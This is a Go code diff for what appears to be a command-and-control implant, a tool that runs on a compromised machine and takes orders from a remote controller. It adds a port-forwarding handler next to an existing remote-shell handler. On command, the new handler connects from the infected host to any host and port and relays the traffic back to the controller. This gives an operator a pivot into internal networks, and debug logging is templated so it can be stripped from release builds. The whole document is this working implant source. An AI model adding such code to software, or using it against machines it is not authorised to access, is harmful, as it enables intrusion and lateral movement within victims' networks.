@@ -1,7 +1,9 @@
 package handlers
 
 import (
+	"fmt"
 	"io"
+	"net"
 
 	// {{if .Debug}}
 	"log"
@@ -20,7 +22,8 @@ const (
 
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
-		pb.MsgShellReq: shellReqHandler,
+		pb.MsgShellReq:   shellReqHandler,
+		pb.MsgPortfwdReq: portfwdHandler,
 
 		pb.MsgTunnelData:  tunnelDataHandler,
 		pb.MsgTunnelClose: tunnelCloseHandler,
@@ -131,4 +134,78 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
+}
+
+func portfwdHandler(envelope *pb.Envelope, connection *transports.Connection) {
+	pfwdReq := &pb.PortFwdReq{}
+	err := proto.Unmarshal(envelope.Data, pfwdReq)
+	if err != nil {
+		return
+	}
+
+	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", pfwdReq.Host, pfwdReq.Port))
+	if err != nil {
+		return
+	}
+	tunnel := &transports.Tunnel{
+		ID:     pfwdReq.TunnelID,
+		Reader: conn,
+		Writer: conn,
+	}
+	connection.AddTunnel(tunnel)
+
+	pfwdResp, _ := proto.Marshal(&pb.PortFwd{Success: true})
+	connection.Send <- &pb.Envelope{
+		ID:   envelope.ID,
+		Data: pfwdResp,
+	}
+
+	// Cleanup function with arguments
+	cleanup := func(reason string) {
+		// {{if .Debug}}
+		log.Printf("[portfwd] Closing tunnel %d, reason: %s", tunnel.ID, reason)
+		// {{end}}
+		connection.RemoveTunnel(tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&pb.TunnelClose{
+			TunnelID: tunnel.ID,
+			Err:      reason,
+		})
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgTunnelClose,
+			Data: tunnelClose,
+		}
+		// Close connection
+		conn.Close()
+	}
+
+	go func() {
+		for {
+			readBuf := make([]byte, readBufSize)
+			n, err := tunnel.Reader.Read(readBuf)
+			if err == io.EOF {
+				//{{if .Debug}}
+				log.Println("[portfwd] Read EOF on tunnel %d", tunnel.ID)
+				//{{end}}
+				defer cleanup("EOF")
+				return
+			}
+			//{{if .Debug}}
+			if n > 0 {
+				log.Printf("[portfwd] stdout %d bytes on tunnel %d\n", n, tunnel.ID)
+			}
+			//{{end}}
+			data, err := proto.Marshal(&pb.TunnelData{
+				TunnelID: tunnel.ID,
+				Data:     readBuf[:n],
+			})
+			connection.Send <- &pb.Envelope{
+				Type: pb.MsgTunnelData,
+				Data: data,
+			}
+		}
+	}()
+
+	// {{if .Debug}}
+	log.Printf("Started portfwd to %s:%d with tunnel ID %d", pfwdReq.Host, pfwdReq.Port, tunnel.ID)
+	// {{end}}
 }
